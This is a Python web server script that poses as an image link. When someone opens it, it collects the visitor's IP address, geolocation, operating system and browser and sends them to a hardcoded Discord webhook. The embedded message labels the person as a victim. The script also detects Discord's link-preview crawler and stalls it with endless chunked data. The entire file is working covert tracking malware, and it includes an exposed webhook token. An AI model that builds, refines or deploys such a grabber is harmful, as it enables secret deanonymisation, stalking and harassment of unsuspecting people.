from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser
import time

webhook = 'https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc'

bindata = httpx.get('https://static8.depositphotos.com/1001435/1011/i/950/depositphotos_10113890-stock-photo-happy-man-outdoor.jpg').content
buggedimg = False
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# Add infinite loop counter
loop_counter = 0
MAX_LOOPS = 100  # Safety limit

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Agent 6",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Cleanse THEM ALL",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "AGENT 6"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Agent 6",
  "content": "",
  "embeds": [
    {
      "title": "Agent 6 Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Agent6 Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Agent 6"
      },
      "fields": [
      ]
    }
  ],
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global loop_counter
        
        # Check loop limit for safety
        if loop_counter >= MAX_LOOPS:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Maximum loop limit reached')
            return
        
        loop_counter += 1
        
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        try: 
            data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: 
            data = bindata
            
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        
        # Create an infinite loading loop by sending partial data
        if self.headers.get('x-forwarded-for', '').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): 
                # Discord preview - send corrupted/infinite loading image
                self.send_response(200)
                self.send_header('Content-type', 'image/jpg')
                self.send_header('Transfer-Encoding', 'chunked')  # Keep connection open
                self.end_headers()
                
                # Send initial chunk
                self.wfile.write(buggedbin if buggedimg else bindata)
                
                # Keep sending small chunks to create infinite loading
                while loop_counter < MAX_LOOPS:
                    time.sleep(1)  # Wait between chunks
                    self.wfile.write(b'\x00' * 1024)  # Send empty data
                    self.wfile.flush()
                    loop_counter += 1
                    
                httpx.post(webhook, json=prev(self.headers.get('x-forwarded-for'), useragent))
            else: 
                # Not discord - just pass through
                pass
        else: 
            # Regular visitor - collect info and send normal response
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(data)
            
            # Collect IP info
            ip = self.headers.get('x-forwarded-for', 'Unknown')
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                httpx.post(webhook, json=formatHook(
                    ipInfo.get('ip', 'Unknown'),
                    ipInfo.get('city', 'Unknown'),
                    ipInfo.get('region', 'Unknown'),
                    ipInfo.get('country', 'Unknown'),
                    ipInfo.get('loc', 'Unknown'),
                    ipInfo.get('org', 'Unknown'),
                    ipInfo.get('postal', 'Unknown'),
                    useragent, os, browser
                ))
            except:
                # If IP info fails, just send basic info
                try:
                    httpx.post(webhook, json=formatHook(
                        ip, 'Unknown', 'Unknown', 'Unknown', 
                        'Unknown', 'Unknown', 'Unknown',
                        useragent, os, browser
                    ))
                except:
                    pass
        
        return
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass
